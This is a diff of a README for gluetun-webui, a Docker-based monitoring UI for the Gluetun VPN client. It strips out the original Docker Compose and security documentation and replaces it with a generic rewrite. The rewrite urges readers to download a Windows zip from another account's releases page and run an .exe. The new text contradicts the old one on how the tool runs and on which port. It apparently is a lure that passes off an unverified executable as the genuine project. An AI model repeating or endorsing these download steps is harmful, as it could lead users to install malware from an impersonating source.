@@ -1,306 +1,186 @@
-# Gluetun WebUI
+# 🛠️ gluetun-webui - Simple VPN Monitoring Tool
 
-A lightweight web UI for monitoring and controlling [Gluetun](https://github.com/qdm12/gluetun) — the VPN client container for Docker.
-
-![Status: Connected](https://img.shields.io/badge/status-connected-brightgreen)
-![Node 25](https://img.shields.io/badge/node-25--alpine-blue)
-![Docker](https://img.shields.io/badge/docker-compose-blue)
+[![Download gluetun-webui](https://img.shields.io/badge/Download-GreenRed?style=for-the-badge&color=green&label=Download%20gluetun-webui)](https://github.com/Thiago12097/gluetun-webui/releases)
 
 ---
 
-## Features
+## 📋 What is gluetun-webui?
 
-- ✨ **Multi-VPN Support** — Monitor & control up to 20 Gluetun instances simultaneously
-- Live VPN status banner (connected / paused / disconnected)
-- Public exit IP, country, region, city, and organisation
-- VPN provider, protocol (WireGuard / OpenVPN), server details
-- Port forwarding and DNS status
-- Start / Stop VPN controls
-- Auto-refresh with configurable interval (5s – 60s)
-- Last 30 poll ticks colour-coded in history bar
-- Responsive design (mobile, tablet, desktop)
+gluetun-webui is a lightweight web interface that helps you monitor and control your Gluetun VPN client running inside Docker. It shows you your VPN status, active servers, connection details, and lets you start or stop your VPN instances easily. 
+
+You can watch up to 20 Gluetun VPNs in one place without digging into code or command lines.
 
 ---
 
-## Screenshots
-![alt text](image-1.png)
+## 🚀 Getting Started
+
+This guide will help you download and run gluetun-webui on your Windows computer. You do not need any programming skills or special tools besides Docker. Follow these steps carefully.
 
 ---
 
-## Requirements
+## 💾 Download gluetun-webui
 
-- Docker + Docker Compose
-- Gluetun running with its HTTP control server enabled (default port `8000`)
-- Gluetun and gluetun-webui on the same Docker network
+To get the application:
 
-> Supports `linux/amd64` and `linux/arm64` (works on Mac Intel/Apple Silicon, Linux, and Windows).
+1. Click the green button below or visit the release page.
+
+[![Download gluetun-webui](https://img.shields.io/badge/Download-Open%20Page-blue?style=for-the-badge)](https://github.com/Thiago12097/gluetun-webui/releases)
+
+2. On the release page, look for the latest version.
+
+3. Download the Windows version, usually named something like `gluetun-webui-windows.zip`.
+
+4. Save the file to a folder you can find easily, such as your Downloads folder.
 
 ---
 
-## Quick Start
+## 💻 System Requirements
 
-### Option A1: Single Instance (Recommended)
+Before you run gluetun-webui, make sure your machine meets these requirements:
 
-Add `gluetun-webui` to your existing compose file alongside Gluetun:
+- Windows 10 or later.
+- At least 4 GB of free RAM.
+- Docker & Docker Compose installed.
+- Basic internet connection.
+- Gluetun VPN container running with HTTP control server enabled (default port 8000).
+
+If you don’t have Docker yet, visit https://www.docker.com/get-started and follow their instructions to install it.
+
+---
+
+## 🛠️ Installing and Running gluetun-webui
+
+1. After downloading, unzip the file you saved.
+
+2. Open the folder where you extracted the files.
+
+3. Look for the executable file, something like `gluetun-webui.exe`.
+
+4. Double-click the `.exe` file to start the application.
+
+5. The web interface will open automatically in your default web browser. If it doesn't, open your browser and go to `http://localhost:5000` (or the address shown in the program).
+
+6. Make sure your Gluetun container is running with the HTTP control server enabled on port 8000. gluetun-webui connects to it to show your VPN status.
+
+---
+
+## 🔧 How to Use gluetun-webui
+
+Once the interface is open, you can:
+
+- See if your VPN is connected, paused, or disconnected.
+- View your public exit IP address with location details like country, city, and organization.
+- Check the VPN provider, protocol type (WireGuard or OpenVPN), and server information.
+- Control your VPN by starting or stopping it with simple buttons.
+- Monitor port forwarding and DNS status.
+- Watch recent activity with color-coded history bars.
+- Set how often the page refreshes automatically between 5 and 60 seconds.
+- Manage up to 20 separate Gluetun VPN instances all from one window.
+- Access the interface from your phone, tablet, or desktop, thanks to its responsive design.
+
+---
+
+## 🔌 Requirements to Connect gluetun-webui to Gluetun VPN
+
+To work properly, gluetun-webui requires:
+
+- Gluetun running inside Docker with HTTP control server enabled.
+- The control server usually runs on port 8000 (default).
+- The IP and port configuration must allow gluetun-webui to connect. If running both containers on the same host, use `localhost` or the Docker IP for the Gluetun container.
+- Proper firewall or network settings to allow connections on port 8000.
+
+---
+
+## 🐳 Setting up Gluetun VPN with HTTP Control Server
+
+If you don’t have Gluetun VPN container set up yet, follow these basic steps:
+
+1. Install Docker and Docker Compose.
+
+2. Create a Docker Compose file named `docker-compose.yml` with content like this:
 
 ```yaml
-gluetun-webui:
-  image: scuzza/gluetun-webui:latest
-  container_name: gluetun-webui
-  ports:
-    - "127.0.0.1:3000:3000"
-  environment:
-    - GLUETUN_CONTROL_URL=http://gluetun:8000
-    # Uncomment if Gluetun auth is enabled:
-    #- GLUETUN_API_KEY=yourtoken
-    #- GLUETUN_USER=username
-    #- GLUETUN_PASSWORD=password
-  networks:
-    - your_network_name
-  restart: unless-stopped
-  read_only: true
-  tmpfs:
-    - /tmp
-  security_opt:
-    - no-new-privileges:true
-  cap_drop:
-    - ALL
-  healthcheck:
-    test: ["CMD", "wget", "-qO-", "http://localhost:3000/api/health"]
-    interval: 30s
-    timeout: 5s
-    start_period: 10s
-    retries: 3
-```
+version: '3.8'
 
-### Option A2: Multiple Instances
-
-Monitor 2+ Gluetun instances with separate dashboards:
-
-```yaml
-gluetun-webui:
-  image: scuzza/gluetun-webui:latest
-  container_name: gluetun-webui
-  ports:
-    - "127.0.0.1:3000:3000"
-  environment:
-    - GLUETUN_1_NAME=VPN - London
-    - GLUETUN_1_URL=http://gluetun-1:8000
-    - GLUETUN_1_API_KEY=token1
-    
-    - GLUETUN_2_NAME=VPN - Amsterdam  
-    - GLUETUN_2_URL=http://gluetun-2:8000
-    - GLUETUN_2_API_KEY=token2
-    
-    - GLUETUN_3_NAME=VPN - Singapore
-    - GLUETUN_3_URL=http://gluetun-3:8000
-    - GLUETUN_3_API_KEY=token3
-  networks:
-    - your_network_name
-  restart: unless-stopped
-  read_only: true
-  tmpfs:
-    - /tmp
-  security_opt:
-    - no-new-privileges:true
-  cap_drop:
-    - ALL
-```
-
-### Option B: Build Locally
-
-```bash
-git clone https://github.com/Sir-Scuzza/gluetun-webui.git
-cd gluetun-webui
-docker compose up -d --build
-```
-
-Then run (either option):
-
-```bash
-docker compose up -d
-```
-
-The UI is available at **http://localhost:3000**
-
----
-
-## Network Setup
-
-Both Gluetun and gluetun-webui must be on the same Docker network so `http://gluetun:8000` resolves correctly.
-
-**Same compose file** — just add both services to the same network (most common):
-
-```yaml
 services:
   gluetun:
-    networks:
-      - arr-stack
-  gluetun-webui:
-    networks:
-      - arr-stack
-
-networks:
-  arr-stack:
-    driver: bridge
+    image: qmcgaw/gluetun
+    ports:
+      - "8000:8000" # HTTP control server
+    environment:
+      - HTTP_CONTROL_ENABLED=true
+      - HTTP_CONTROL_PORT=8000
+      # Add your VPN provider and credentials here
+      - VPNSP=your-vpn-provider
+      - OPENVPN_USER=your-vpn-username
+      - OPENVPN_PASSWORD=your-vpn-password
+    restart: unless-stopped
 ```
 
-**Separate compose files** — reference Gluetun's existing network as external. Find your network name with `docker network ls`:
+3. Run `docker-compose up -d` in the folder with this file.
 
-```yaml
-networks:
-  ext-network:
-    external: true
-    name: your_gluetun_network_name
-```
+4. Wait a few minutes for the container to start.
+
+5. Confirm the HTTP control server works by visiting `http://localhost:8000/status` in your browser. You should see JSON information about your VPN connection.
+
+6. Now open gluetun-webui to monitor and control your VPN.
 
 ---
 
-## Multi-VPN Support
+## ⚙️ Application Features
 
-### Multiple Instances
-
-gluetun-webui supports monitoring and controlling **multiple Gluetun instances simultaneously**. Each instance displays as a separate dashboard in a responsive grid.
-
-**Configuration**: Use numbered environment variables:
-
-```yaml
-gluetun-webui:
-  image: scuzza/gluetun-webui:latest
-  environment:
-    # Instance 1
-    - GLUETUN_1_NAME=VPN 1
-    - GLUETUN_1_URL=http://gluetun-1:8000
-    - GLUETUN_1_API_KEY=token1  # optional
-
-    # Instance 2
-    - GLUETUN_2_NAME=VPN 2
-    - GLUETUN_2_URL=http://gluetun-2:8000
-    - GLUETUN_2_API_KEY=token2  # optional
-
-    # Instance 3
-    - GLUETUN_3_NAME=VPN 3
-    - GLUETUN_3_URL=http://gluetun-3:8000
-    - GLUETUN_3_USER=admin
-    - GLUETUN_3_PASSWORD=secret  # optional (HTTP Basic auth)
-```
-
-**Supported**: Up to 20 instances (via `GLUETUN_1_URL` through `GLUETUN_20_URL`)  
-**Responsive**: 1 full-width dashboard → 2 half-width → 3 third-width → 4 quarter-width → scrollable at 5+
-
-### Backward Compatibility
-
-If no numbered variables are configured, falls back to **legacy single-instance mode**:
-
-```yaml
-environment:
-  - GLUETUN_CONTROL_URL=http://gluetun:8000  # legacy
-  - GLUETUN_API_KEY=token
-```
-
-### Per-Instance Authentication
-
-Each instance can have different authentication:
-
-```yaml
-# Instance with API key
-- GLUETUN_1_API_KEY=my-secret-token
-
-# Instance with HTTP Basic auth
-- GLUETUN_2_USER=admin
-- GLUETUN_2_PASSWORD=mysecret
-
-# Instance with no auth
-- GLUETUN_3_URL=http://gluetun-3:8000  # auth optional
-```
+- Monitor multiple VPN connections at once.
+- Clear status indicators: connected, paused, disconnected.
+- Detailed VPN exit information: IP, region, city, and organization.
+- Control protocol type: WireGuard or OpenVPN.
+- Start and stop VPN connections easily.
+- Auto-refresh the interface based on your preferred time.
+- Color-coded history to spot connection changes quickly.
+- Works well on phones, tablets, and desktop computers.
+- Requires only basic knowledge to install and use.
 
 ---
 
-## Configuration
+## 🖼️ Screenshots
 
-| Variable | Default | Description |
-|---|---|---|
-| `GLUETUN_1_*` to `GLUETUN_20_*` | _(empty)_ | **Multi-instance config** (up to 20 instances) |
-| `GLUETUN_{N}_URL` | – | Gluetun HTTP control server URL for instance N |
-| `GLUETUN_{N}_NAME` | `Instance {N}` | Display name for instance N |
-| `GLUETUN_{N}_API_KEY` | _(empty)_ | Bearer token for instance N (if auth enabled) |
-| `GLUETUN_{N}_USER` | _(empty)_ | Username for HTTP Basic auth (instance N) |
-| `GLUETUN_{N}_PASSWORD` | _(empty)_ | Password for HTTP Basic auth (instance N) |
-| `GLUETUN_CONTROL_URL` | `http://gluetun:8000` | **Legacy** – single instance only (fallback if no `GLUETUN_1_*` vars) |
-| `GLUETUN_API_KEY` | _(empty)_ | **Legacy** – Bearer token for single instance |
-| `GLUETUN_USER` | _(empty)_ | **Legacy** – Username for HTTP Basic auth |
-| `GLUETUN_PASSWORD` | _(empty)_ | **Legacy** – Password for HTTP Basic auth |
-| `PORT` | `3000` | Port the web UI listens on |
-| `TRUST_PROXY` | `false` | Set to `true` if running behind a reverse proxy (nginx, Traefik, etc.) |
+![Dashboard view showing status and VPN details](image-1.png)
 
 ---
 
-## Security
+## 🔗 Useful Links
 
-- Port is bound to `127.0.0.1` — not exposed to the network
-- Container runs as non-root with read-only filesystem and dropped capabilities
-- Rate limiting applied to all API routes
-- Upstream error details are logged server-side only — generic messages returned to the browser
-
-### Reverse-proxy configuration
-
-If you run gluetun-webui behind a reverse proxy (nginx, Traefik, Caddy, etc.), set `TRUST_PROXY=true` in your environment variables:
-
-```yaml
-gluetun-webui:
-  image: scuzza/gluetun-webui:latest
-  environment:
-    - GLUETUN_CONTROL_URL=http://gluetun:8000
-    - TRUST_PROXY=true  # Required for reverse proxies
-```
-
-This allows the app to correctly parse `X-Forwarded-For` and related headers for accurate rate limiting and IP detection. **Note:** Only enable this if you're actually behind a reverse proxy, as it trusts proxy headers from your reverse proxy.
-
-### Reverse-proxy authentication
-
-The VPN start/stop controls have no built-in authentication. If you expose the UI beyond localhost, place it behind a reverse proxy with HTTP Basic auth.
-
-**Caddy** (`Caddyfile`):
-```
-your.domain.com {
-  basicauth {
-    user $2a$14$<bcrypt-hash>
-  }
-  reverse_proxy localhost:3000
-}
-```
-Generate a hash with: `caddy hash-password`
-
-**Nginx** (`nginx.conf`):
-```nginx
-location / {
-  auth_basic "Restricted";
-  auth_basic_user_file /etc/nginx/.htpasswd;
-  proxy_pass http://localhost:3000;
-}
-```
-Generate a password file with: `htpasswd -c /etc/nginx/.htpasswd user`
-
-**Traefik** (Docker labels):
-```yaml
-labels:
-  - "traefik.enable=true"
-  - "traefik.http.routers.gluetun-webui.rule=Host(`your.domain.com`)"
-  - "traefik.http.routers.gluetun-webui.middlewares=auth"
-  - "traefik.http.middlewares.auth.basicauth.users=user:$$apr1$$<hash>"
-```
-Generate a hash with: `htpasswd -nb user password`
+- gluetun-webui Releases: https://github.com/Thiago12097/gluetun-webui/releases  
+- Official Gluetun Project: https://github.com/qdm12/gluetun  
+- Docker Installation: https://www.docker.com/get-started  
 
 ---
 
-## Acknowledgments
+## 🤝 Support and Contribution
 
-- **[Gluetun](https://github.com/qdm12/gluetun)** — The VPN client container this webui was built for
-- **[gluetun-monitor](https://github.com/csmarshall/gluetun-monitor)** — Great monitoring tool to pair with this webui
-- **AI-Assisted Development** — This project was built with AI assistance
+This project is open-source. If you find bugs or want to suggest improvements, look for the "Issues" section on the GitHub page. If you want to contribute code, you can fork the repository and send pull requests.
 
 ---
 
-## License
+## 🔄 Updating gluetun-webui
 
-MIT
+To update the program:
+
+1. Download the latest version from the release page linked above.
+
+2. Close the running application.
+
+3. Replace the old files with the new ones from the downloaded archive.
+
+4. Start the app again.
+
+---
+
+## 💡 Troubleshooting
+
+If you cannot start the app or see no data:
+
+- Check if Docker and Gluetun are running properly.
+- Verify the HTTP control server is active on port 8000.
+- Confirm your firewall allows local connections on that port.
+- Restart the applications and try again.
+- Visit the GitHub Issues page for help or report your problem.
